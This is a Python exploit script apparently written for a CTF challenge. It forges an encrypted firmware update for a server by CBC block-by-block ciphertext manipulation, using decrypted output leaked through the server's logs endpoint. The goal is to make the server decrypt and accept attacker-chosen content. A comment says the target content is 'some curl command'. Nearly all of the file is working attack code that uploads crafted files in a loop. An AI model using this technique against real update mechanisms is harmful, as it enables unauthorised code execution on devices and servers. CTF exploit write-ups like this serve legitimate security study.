# The idea is to define in the target file the firmware, we want to get onto the server.
# We will define a target_data file, that contains all data, that should be send in the end after bein decrypted.
# This will be the basic to compare the retrieved decryption, with current selected update.bin blocks, with the target_data.
# our update.bin will be crafted with the general header and in the end the crafted encrypted data
# this encrypted data will be blockwise brootforced to get the target_data in the end
import requests
import re
import pwn

from crcmod.predefined import mkPredefinedCrcFun


crc16 = mkPredefinedCrcFun("x-25")


def read_file(filename):
    try:
        # Open the file in binary read mode
        with open(filename, 'rb') as file:
            return file.read()
    except FileNotFoundError:
        print(f"No file found with the name {filename}. Please check the file path.")
        return None
    except IOError as e:
        print(f"An error occurred while reading the file: {e}")
        return None


def write_file(filename, data):
    """
    Writes byte data to a specified file.

    Args:
    - filename (str): The path to the file where the byte data will be written.
    - data (bytes): The byte data to write to the file.

    Returns:
    - None
    """
    try:
        # Open the file in binary write mode
        with open(filename, 'wb') as file:
            file.write(data)
        #print("Data successfully written to file.")
    except IOError as e:
        print(f"An error occurred while writing to the file: {e}")




def fetch_data(url):
    """Fetch data from the specified URL and return the content as bytes."""
    try:
        # Send a GET request to the URL
        response = requests.get(url)
        
        # Check if the request was successful
        if response.status_code == 200:
            data = response.content  # Return the content of the response as a bytes object
            print(data)
            pattern = re.compile(rb"b'([^']*)'")
            pattern = re.compile(rb"b'([^'\\]*(?:\\.[^'\\]*)*)'(?!(?:[^']*'b))", re.DOTALL)
            
            # Searching for the first occurrence of byte string pattern
            match = pattern.findall(data)

            if match:
                if 8208 > len(match[2].decode('unicode_escape')):
                    pattern = re.compile(rb'b"([^"\\]*(?:\\.[^"\\]*)*)"(?!(?:[^"]*"b))', re.DOTALL)
                    match = pattern.findall(data)
                    return match[0].decode('unicode_escape').encode('latin1')
                return match[2].decode('unicode_escape').encode('latin1')
            else:
                print(data)
                print("No byte string found in the data.")

        else:
            print(f"Failed to retrieve data: Status code {response.status_code}")
            return None
    except requests.RequestException as e:
        print(f"An error occurred: {e}")
        return None

# Example usage
url = "https://8503c6fe4ac8634a6df8dde7-8000-bulb.challenge.cscg.live:1337/"
#url = "http://127.0.0.1:5000/"
url_logs = url + "logs"
url_update = url + "update"



def upload_file(url, file_path):
    """Upload a file to a specified URL simulating a form submission.

    Args:
        url (str): The URL to which the file is uploaded.
        file_path (str): The path to the file on local disk to be uploaded.

    Returns:
        bool: True if the file was uploaded successfully, False otherwise.
    """
    try:
        # Open the file in binary mode
        with open(file_path, 'rb') as file:
            # The 'files' parameter takes a dictionary with the form field name (file) and a file object
            files = {'file': file}
            # Make a POST request to upload the file
            response = requests.post(url, files=files)

            # Check if the server responded with a successful status code
            if response.status_code == 200:
                #print("File uploaded successfully!")
                return True
            else:
                print(f"Failed to upload file: {response.status_code} - {response.text}")
                exit()
                return False
    except IOError as e:
        print(f"Error opening file: {e}")
        return False
    except requests.RequestException as e:
        print(f"HTTP Request failed: {e}")
        return False



target = "target" # some curl command
target_data = "target_data" # magic | target | CRC(magic + target)
update = "update" # header | encrypt(target_data) 


header = read_file("update.bin")[0:64]
write_file(update, header + 8208 * b'\xff') #read_file("update.bin")[64:])
upload_file(url_update, update)
input("wait 3 seconds")

magic = b'DECRYPT' + 7 * b'\x00' 

target_data_bytes = magic + read_file(target)
target_data_bytes += (8206 - len(target_data_bytes)) * b'\x00' 
crc = crc16(target_data_bytes)
target_data_bytes += pwn.p16(crc)

write_file(target_data, target_data_bytes)

blocksize = 16
for i in range( 8272 - blocksize -1, 64  -1, - blocksize):
    data = fetch_data(url_logs)
    #input(data)
    #print(data[-1])
    #input()
    if data is not None:
        cur = read_file(update)
        # update <- update[0:-2] + data[-1] ^ target_data[-1] + update[-1]
        # write_file(update, cur[0: (64 + i - blocksize) ] + (int.from_bytes((data[i: i + blocksize]),"big") ^ int.from_bytes(read_file(target_data)[i:i+blocksize],"big") ).to_bytes(16,"big") + cur[(64 + i):])
        decrypted_block = data[i - 64 +1: i - 64  + blocksize+1]
        if decrypted_block == b'':
            print(data)
            print("exit")
            exit()
        target_block = read_file(target_data)[i - 64 + 1 : i - 64 + blocksize +1]
        old_encrypted_block = cur[i-blocksize+1:i+1]
        block = (int.from_bytes(decrypted_block,"big") ^ int.from_bytes(target_block,"big") ^ int.from_bytes(old_encrypted_block,"big")).to_bytes(16,"big")
        #print("Pn_old: ",decrypted_block) # data
        #print("Pn_tar: ",target_block) # target data
        #print("Cn_old: ",old_encrypted_block) # update
        #print("Cn_new: ",block) # xor
        tmp = cur[0:i-blocksize+1] +  block  + cur[i+1:]
        write_file(update, tmp)
    else:
        print("Failed to retrieve data.")
        exit()

    if upload_file(url_update, update):
        #print("Success!")
        pass
    else:
        print("Upload failed.")
        exit()

data = fetch_data(url_logs)
cur = read_file(update)

decrypted_block = data[ : blocksize]
target_block = read_file(target_data)[ : blocksize ]
old_encrypted_block = cur[48:64]
block = (int.from_bytes(decrypted_block,"big") ^ int.from_bytes(target_block,"big") ^ int.from_bytes(old_encrypted_block,"big")).to_bytes(16,"big")
iv = block
tmp  = cur[:48] + iv + cur[64:]
write_file(update,tmp)
upload_file(url_update, update)
print(requests.get(url_logs).content)
